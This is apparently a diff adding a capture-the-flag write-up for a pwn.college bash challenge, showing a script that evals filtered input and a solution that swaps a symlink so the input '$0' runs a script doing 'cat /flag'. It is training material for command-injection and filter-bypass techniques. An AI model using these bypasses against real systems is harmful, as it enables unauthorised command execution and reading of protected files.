@@ -58,3 +58,38 @@ ln -s /flag IPNUT
 ``` sh
 $(< ${_})
 ```
+# Riddle of the Radix
+### chal
+``` sh
+#!/usr/bin/env -iS /opt/pwn.college/bash
+
+PATH=/usr/bin
+
+WORKDIR=$(mktemp -d)
+[ -n "$WORKDIR" ] || exit 1
+cd $WORKDIR
+
+doit() {
+        echo -n ""
+        read -r INPUT < <(head -n1 | tr -d "[A-Za-z./]")
+        eval "$INPUT"
+}
+
+doit
+```
+### sol
+creat symlink to /challenge/run
+``` sh
+ln -s /challenge/run smth
+```
+run the challenge with symlink using full path
+``` sh
+/home/hacker/smth
+```
+before passing input to challenge, in another terminal remove the symlink and create some program with same name as a symlink that reads /flag
+``` sh
+#!/usr/bin/bash
+
+cat /flag
+```
+pass $0 to challenge as an input
